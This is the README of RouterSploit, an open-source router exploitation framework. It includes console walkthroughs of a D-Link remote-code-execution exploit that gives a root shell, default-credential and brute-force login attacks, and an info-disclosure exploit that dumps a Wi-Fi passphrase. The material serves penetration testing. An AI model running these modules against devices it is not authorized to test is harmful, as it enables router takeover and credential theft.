# RouterSploit - Router Exploitation Framework

[![Python 2.7](https://img.shields.io/badge/Python-2.7-yellow.svg)](http://www.python.org/download/)
[![Build Status](https://travis-ci.org/reverse-shell/routersploit.svg?branch=master)](https://travis-ci.org/reverse-shell/routersploit)
[![Join the chat at https://gitter.im/reverse-shell/routersploit](https://badges.gitter.im/reverse-shell/routersploit.svg)](https://gitter.im/reverse-shell/routersploit?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)

The RouterSploit Framework is an open-source exploitation framework dedicated to embedded devices.

[![asciicast](https://asciinema.org/a/8u75xcjuacnbpwz9feaixde9e.png)](https://asciinema.org/a/8u75xcjuacnbpwz9feaixde9e?autoplay=1)

It consists of various modules that aids penetration testing operations:

- exploits - modules that take advantage of identified vulnerabilities
- creds - modules designed to test credentials against network services
- scanners - modules that check if a target is vulnerable to any exploit

# Installation

## Requirements

* gnureadline (OSX only)
* requests
* paramiko
* beautifulsoup4
* pysnmp

## Installation on Kali

	git clone https://github.com/reverse-shell/routersploit
	cd routersploit
	./rsf.py

## Installation on Ubuntu 16.04

	sudo apt-get install python-dev python-pip libncurses5-dev git
	git clone https://github.com/reverse-shell/routersploit
	cd routersploit
	sudo pip install -r requirements.txt
	./rsf.py

## Installation on Centos 7

	sudo yum install python-devel python2-pip ncurses-devel git
	git clone https://github.com/reverse-shell/routersploit
	pip install -r requirements.txt
	./rsf.py

## Installation on OSX

	git clone https://github.com/reverse-shell/routersploit
	cd routersploit
	sudo easy_install pip
	sudo pip install -r requirements.txt
	./rsf.py

## Running on Docker

    git clone https://github.com/reverse-shell/routersploit
    cd routersploit
    docker build -t routersploit:latest -f Dockerfile .
    ./run_docker.sh

# Update

Update RouterSploit Framework often. The project is under heavy development and new modules are shipped almost every day.

    cd routersploit
    git pull

# Usage

	root@kalidev:~/git/routersploit# ./rsf.py
	 ______            _            _____       _       _ _
	 | ___ \          | |          /  ___|     | |     (_) |
	 | |_/ /___  _   _| |_ ___ _ __\ `--. _ __ | | ___  _| |_
	 |    // _ \| | | | __/ _ \ '__|`--. \ '_ \| |/ _ \| | __|
	 | |\ \ (_) | |_| | ||  __/ |  /\__/ / |_) | | (_) | | |_
	 \_| \_\___/ \__,_|\__\___|_|  \____/| .__/|_|\___/|_|\__|
	                                     | |
	     Router Exploitation Framework   |_|

	 Dev Team : Marcin Bury (lucyoa) & Mariusz Kupidura (fwkz)
	 Codename : Wildest Dreams
	 Version  : 1.0.0

	rsf >

## 1. Exploits

### Pick the module

	rsf > use exploits/
	exploits/2wire/     exploits/asmax/     exploits/asus/      exploits/cisco/     exploits/dlink/     exploits/fortinet/  exploits/juniper/   exploits/linksys/   exploits/multi/     exploits/netgear/
	rsf > use exploits/dlink/dir_300_600_rce
	rsf (D-LINK DIR-300 & DIR-600 RCE) >

You can use the tab key for completion.

### Options

Display module options:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > show options

	Target options:


	   Name       Current settings     Description                                
	   ----       ----------------     -----------                                
	   target                          Target address e.g. http://192.168.1.1     
	   port       80                   Target Port

Set options:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > set target http://192.168.1.1
	[+] {'target': 'http://192.168.1.1'}

### Run module

You can exploit the target by issuing the 'run' or 'exploit' command:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > run
	[+] Target is vulnerable
	[*] Invoking command loop...
	cmd > whoami
	root

It is also possible to check if the target is vulnerable to particular exploit:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > check
	[+] Target is vulnerable

### Info

Display information about exploit:

	rsf (D-LINK DIR-300 & DIR-600 RCE) > show info

	Name:
	D-LINK DIR-300 & DIR-600 RCE

	Description:
	Module exploits D-Link DIR-300, DIR-600 Remote Code Execution vulnerability which allows executing command on operating system level with root privileges.

	Devices:
	- D-Link DIR 300
	- D-Link DIR 600

	Authors:
	- Michael Messner <devnull[at]s3cur1ty.de> # vulnerability discovery
	- Marcin Bury <marcin.bury[at]reverse-shell.com> # routersploit module

	References:
	- http://www.dlink.com/uk/en/home-solutions/connect/routers/dir-600-wireless-n-150-home-router
	- http://www.s3cur1ty.de/home-network-horror-days
	- http://www.s3cur1ty.de/m1adv2013-003

## 2. Creds

### Pick module

Modules located in the `creds/` directory allow running dictionary attacks against various network services.

The following services are currently supported:

- ftp
- ssh
- telnet
- http basic auth
- http digest auth
- http form auth
- snmp

Every service has been divided into two modules:

- default (e.g. ssh_default) - this kind of modules use one wordlist with default credentials pairs login:password. The module can be quickly used and in matter of seconds can verify if the device uses default credentials.  
- bruteforce (e.g. ssh_bruteforce) - this kind of modules perform dictionary attacks against a specified account or list of accounts. It takes two parameters: login and password. These values can be a single word (e.g. 'admin') or an entire list of strings (file:///root/users.txt).

Console:

    rsf > use creds/
    creds/ftp_bruteforce         creds/http_basic_bruteforce  creds/http_form_bruteforce   creds/snmp_bruteforce        creds/ssh_default            creds/telnet_default         
    creds/ftp_default            creds/http_basic_default     creds/http_form_default      creds/ssh_bruteforce         creds/telnet_bruteforce      
    rsf > use creds/ssh_default
    rsf (SSH Default Creds) >

### Options

    rsf (SSH Default Creds) > show options

    Target options:

       Name       Current settings     Description           
       ----       ----------------     -----------           
       target                          Target IP address     
       port       22                   Target port           


    Module options:

       Name         Current settings                                                      Description                                              
       ----         ----------------                                                      -----------                                              
       threads      8                                                                     Numbers of threads                                       
       defaults     file:///root/git/routersploit/routersploit/wordlists/defaults.txt     User:Pass or file with default credentials (file://)


Set target:

    rsf (SSH Default Creds) > set target 192.168.1.53
    [+] {'target': '192.168.1.53'}


### Run module

    rsf (SSH Default Creds) > run
    [*] Running module...
    [*] worker-0 process is starting...
    [*] worker-1 process is starting...
    [*] worker-2 process is starting...
    [*] worker-3 process is starting...
    [*] worker-4 process is starting...
    [*] worker-5 process is starting...
    [*] worker-6 process is starting...
    [*] worker-7 process is starting...
    [-] worker-4 Authentication failed. Username: '3comcso' Password: 'RIP000'
    [-] worker-1 Authentication failed. Username: '1234' Password: '1234'
    [-] worker-0 Authentication failed. Username: '1111' Password: '1111'
    [-] worker-7 Authentication failed. Username: 'ADVMAIL' Password: 'HP'
    [-] worker-3 Authentication failed. Username: '266344' Password: '266344'
    [-] worker-2 Authentication failed. Username: '1502' Password: '1502'

    (..)

    Elapsed time:  38.9181981087 seconds
    [+] Credentials found!

    Login     Password     
    -----     --------     
    admin     1234         

    rsf (SSH Default Creds) >

## 3. Scanners

Scanners allow you to quickly verify if the target is vulnerable to any exploits.

### Pick module

    rsf > use scanners/dlink_scan
    rsf (D-Link Scanner) > show options


### Options

    Target options:

       Name       Current settings     Description                                
       ----       ----------------     -----------                                
       target                          Target address e.g. http://192.168.1.1     
       port       80                   Target port                                

Set target:

    rsf (D-Link Scanner) > set target 192.168.1.1
    [+] {'target': '192.168.1.1'}

### Run module

    rsf (D-Link Scanner) > run
    [+] exploits/dlink/dwr_932_info_disclosure is vulnerable
    [-] exploits/dlink/dir_300_320_615_auth_bypass is not vulnerable
    [-] exploits/dlink/dsl_2750b_info_disclosure is not vulnerable
    [-] exploits/dlink/dns_320l_327l_rce is not vulnerable
    [-] exploits/dlink/dir_645_password_disclosure is not vulnerable
    [-] exploits/dlink/dir_300_600_615_info_disclosure is not vulnerable
    [-] exploits/dlink/dir_300_600_rce is not vulnerable

    [+] Device is vulnerable!
     - exploits/dlink/dwr_932_info_disclosure

It has been verified that the target is vulnerable to dwr\_932\_info\_disclosure exploit. Now use the proper module and exploit target.

    rsf (D-Link Scanner) > use exploits/dlink/dwr_932_info_disclosure
    rsf (D-Link DWR-932 Info Disclosure) > set target 192.168.1.1
    [+] {'target': '192.168.1.1'}
    rsf (D-Link DWR-932 Info Disclosure) > exploit
    [*] Running module...
    [*] Decoding JSON value
    [+] Exploit success

       Parameter                  Value                                                                                                 
       ---------                  -----                                                                                                 
       get_wps_enable             0                                                                                                     
       wifi_AP1_enable            1                                                                                                     
       get_client_list            9c:00:97:00:a3:b3,192.168.0.45,IT-PCs,0>40:b8:00:ab:b8:8c,192.168.0.43,android-b2e363e04fb0680d,0     
       wifi_AP1_ssid              dlink-DWR-932                                                                                         
       get_mac_address            c4:00:f5:00:ec:40                                                                                     
       wifi_AP1_security_mode     3208,8                                                                                                
       wifi_AP1_hidden            0                                                                                                     
       get_mac_filter_switch      0                                                                                                     
       wifi_AP1_passphrase        MyPaSsPhRaSe                                                                                          
       get_wps_mode               0

# License

The RouterSploit Framework is under a BSD license.
Please see [LICENSE](LICENSE) for more details.
